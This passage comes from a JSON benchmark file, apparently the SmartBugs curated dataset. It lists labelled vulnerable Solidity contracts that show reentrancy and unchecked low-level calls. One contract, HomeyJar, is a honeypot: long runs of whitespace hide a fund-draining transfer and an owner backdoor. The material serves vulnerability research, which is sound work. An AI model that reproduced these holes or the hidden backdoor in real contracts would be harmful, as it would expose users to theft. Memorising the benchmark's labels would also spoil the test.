}\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface \n{\n    function transfer(address to, uint256 tokens) public returns (bool success);\n}",
    "num_lines": 297,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.19;\n\ncontract HomeyJar {\n    address public Owner = msg.sender;\n   \n    function() public payable {}\n   \n    function GetHoneyFromJar() public payable {                                              \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data) payable public {\n        require(msg.sender == Owner);\n         // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 31,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "reentrance",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/reentrance.sol",
    "contract_code": "/*\n * @source: https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488\n * @author: Alejandro Santander\n * @vulnerable_at_lines: 24\n */\n\npragma solidity ^0.4.18;\n\ncontract Reentrance {\n\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] += msg.value;\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      // <yes> <report> REENTRANCY\n      if(msg.sender.call.value(_amount)()) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  function() public payable {}\n}\n",
    "num_lines": 33,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract DEP_BANK \n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 95,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  }
]